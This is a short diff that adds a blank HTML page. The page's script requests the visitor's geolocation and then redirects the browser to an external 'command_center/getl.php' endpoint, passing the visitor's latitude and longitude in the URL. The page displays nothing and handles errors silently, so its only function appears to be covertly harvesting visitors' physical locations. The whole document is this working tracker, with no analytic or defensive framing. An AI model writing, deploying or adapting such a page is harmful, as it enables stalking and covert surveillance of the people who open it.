@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<head>
+</head>
+<body>
+<script>
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(showPosition, showError);
+}
+function showPosition(position) {
+  var lang = position.coords.latitude;
+  var long = position.coords.longitude;
+  window.location.href = "http://new1.cet-gov.ac.in/command_center/getl.php?lat="+lang+"&&long="+long;
+}
+function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      break;
+    case error.POSITION_UNAVAILABLE:
+      break;
+    case error.TIMEOUT:
+      break;
+    case error.UNKNOWN_ERROR:
+      break;
+  }
+}
+</script>
+</body>
+</html>
